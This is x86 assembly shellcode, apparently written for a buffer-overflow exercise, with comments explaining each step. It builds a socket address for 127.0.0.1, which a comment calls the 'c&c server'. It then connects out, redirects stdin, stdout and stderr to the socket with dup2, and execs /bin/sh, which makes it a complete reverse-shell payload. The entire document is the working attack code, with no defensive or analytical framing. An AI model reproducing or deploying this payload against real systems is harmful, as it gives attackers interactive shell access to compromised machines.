#taking the stack back- before the buffer and thus, before our code. 
sub esp, 0x410
# push 0,1,2 to the stack
xor eax, eax
push eax 
push eax 
mov al, 0x1
push eax
mov al, 0x2
push eax
#call the socket function
mov ebp, 0x8048730
call ebp
#store the socketfd we just got in ecx
mov ecx, eax
xor eax, eax
mov al, 0x10
add esp, eax
#push 127.0.01- as if it was outputed from init address func. this will be the address of the c&c server 
push 0x100007F
#push the port number
push word ptr 0x3905
#push the sin_family. this way we just completly built the socketadrdress struct on the stack
push word ptr 0x2
#ebx will now points to the socketadrdress struct we just built
mov ebx, esp
#push the socketfd - for later use
push ecx
xor edx, edx
push edx
mov dl, 0x10
#push 0x10- the len
push edx
#push the pointer to the socketadrdress struct
push ebx
#push the socketfd
push ecx
#call the connet funtion
mov ebp, 0x08048750
call ebp
#store the socketfd back in ecx as before
pop ecx 
add esp, 0x10
push ecx
xor edx,edx
push edx
push edx
push ecx
#call the dup2 function with 0 and the socketfd
mov ebp, 0x8048600
call ebp
pop eax
pop eax
mov ecx, [esp+4]
xor edx, edx
mov dl, 0x01
push edx
push ecx
# call the dup2 function with 1 and the socketfd
mov ebp, 0x8048600
call ebp
pop eax
pop eax
mov ecx, [esp+4]
xor edx, edx
mov dl, 0x02
push edx
push ecx
# call the dup2 function with 2 and the socketfd
mov ebp, 0x8048600
call ebp
pop eax
pop eax
pop eax
#this will open a shell
jmp want
got:
    #ebx will hold the address of the string below
    pop ebx
    xor edx, edx
    #nulify the @ in the string
    mov [ebx+0x07], dl
    #nulify 4 bytes after the string, for getting an array of {\bin\sh, 0000}
    mov [ebx+0x0c], edx
    #put the adress of the start of the string in BBBB
    mov [ebx+0x08], ebx
    # put the adress to the pointer to the string in ecx- this will cause ecx to actully points to the array as we pleased
    lea ecx,[ebx+0x8]
    push ecx
    push ebx
    #call the execv function
    mov ebp, 0x80486D0
    call ebp
#this part will make sure that the address of the string is on the stack
want:
    call got
    .ASCII "/bin/sh@AAAABBBB"

